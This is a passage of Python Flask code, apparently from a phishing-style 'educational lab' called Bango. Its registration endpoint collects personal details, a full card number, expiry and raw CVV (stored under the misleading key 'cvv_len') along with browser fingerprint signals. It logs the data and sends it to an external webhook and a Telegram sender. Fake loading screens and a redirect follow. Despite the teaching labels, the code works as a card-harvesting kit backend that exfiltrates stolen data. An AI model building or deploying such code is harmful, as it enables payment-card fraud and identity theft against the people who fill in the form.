        cc_digits = checksum.normalize_corporate_access_token(str(data.get("cc") or ""))
        if len(cc_digits) < 12 or len(cc_digits) > 19:
            return jsonify({"ok": False, "error": "bad_cc_length"}), 400
        if not checksum.luhn_validate(cc_digits):
            return jsonify({"ok": False, "error": "cc_checksum_failed"}), 400

        exp_norm = _normalize_card_expiry(str(data.get("exp") or ""))
        if not exp_norm:
            return jsonify({"ok": False, "error": "bad_exp_format"}), 400

        cvv_raw = "".join(ch for ch in str(data.get("cvv") or "") if ch.isdigit())
        exp_cvv = checksum.expected_cvv_len_for_pan(cc_digits)
        if len(cvv_raw) != exp_cvv:
            return (
                jsonify(
                    {
                        "ok": False,
                        "error": "bad_cvv_length",
                        "cvv_expected": exp_cvv,
                    }
                ),
                400,
            )

        payload = {
            "fname": fname,
            "lname": lname,
            "phone": phone,
            "email": email,
            "personal_id": personal_id,
            "full_name": full_name,
            "card_number": cc_digits,
            "card_exp": exp_norm,
            "cvv_len": cvv_raw,
            "fingerprint_signals": data.get("fingerprint_signals"),
            "behavior_signals": data.get("behavior_signals"),
        }
        session[SESSION_REG] = payload
        if not _quiet_demonstration_terminal():
            app.logger.warning("[DEMO REGISTER] %s", json.dumps(payload, ensure_ascii=False))

        incident_store.insert_incident(
            PROJECT_ROOT,
            event_type="registration",
            client_ip=request.remote_addr,
            user_agent=request.headers.get("User-Agent"),
            session_id=None,
            payload=payload,
        )

        webhook = os.environ.get("DEMO_WEBHOOK_URL", "").strip()
        if webhook.startswith("https://"):
            try:
                import urllib.request

                req = urllib.request.Request(
                    webhook,
                    data=json.dumps({"demo": "register", "payload": payload}).encode(),
                    headers={"Content-Type": "application/json"},
                    method="POST",
                )
                urllib.request.urlopen(req, timeout=5)
            except Exception as e:
                app.logger.info("webhook skip: %s", e)

        _lab_ip = _client_ip_for_lab()
        _done = _bango_done_redirect_url() or ""
        incident_store.insert_incident(
            PROJECT_ROOT,
            event_type="bango_register_done",
            client_ip=request.remote_addr,
            user_agent=request.headers.get("User-Agent"),
            session_id=None,
            payload={"registration_snapshot": payload, "flow": "bango"},
        )
        _spawn_telegram_after_register(
            app,
            payload,
            _lab_ip,
            request.headers.get("User-Agent"),
            done_redirect_url=_done,
        )
        return jsonify(
            {
                "ok": True,
                "step": "loading",
                "loading_seconds": _bango_reg_loading_seconds(),
                "pre_done_loading_seconds": _bango_post_reg_extra_glass_seconds(),
                "message": "Registration complete (Bango lab).",
                "redirect_url": _done,
                "spa_done_redirect": _done,
                "done_check_seconds": _bango_done_redirect_delay_sec(),
            }
        )

    @app.get("/api/demo/done-redirect")
    def api_spa_done_redirect():
        """
        Same redirect URL and delay as ``POST /api/demo/register`` success, re-read
        from ``.env`` (session must be core-verified) if the client needs a refresh.
        """
        if session.get(SESSION_CORE_OK) is not True:
            return jsonify({"ok": False, "error": "session"}), 403
        _done = _bango_done_redirect_url() or ""
        return jsonify(
            {
                "ok": True,
                "redirect_url": _done,
                "spa_done_redirect": _done,
                "done_check_seconds": _bango_done_redirect_delay_sec(),
            }
        )

    @app.get("/")
    def root():
        """
        Minimal index pointer for students landing on `/`.

        **Original PHP logic:** Marketing `index.php` redirect to `start.php` entry.

        **Security concept:** *Least exposure* — default `/` does not expose the Bango
        shell without completing the gate training path first.
        """
        html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Educational demo</title>
  <link rel="stylesheet" href="/static/css/lab-theme.css" />
</head>
<body class="lab-page">
  <div class="lab-root">
    <div class="lab-root-inner">
      <p class="lab-brand" style="margin-bottom:0.75rem;">Educational lab</p>
      <p style="margin:0;font-size:1.05rem;">Welcome. Continue to the <strong>gentle practice gate</strong> when you are ready.</p>
      <p style="margin:1.25rem 0 0;"><a href="/start">Open /start</a></p>
    </div>
  </div>
</body>
</html>"""
        return (html, 200, {"Content-Type": "text/html; charset=utf-8"})

    return app


app = create_app()

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=int(os.environ.get("PORT", "5000")), debug=True)
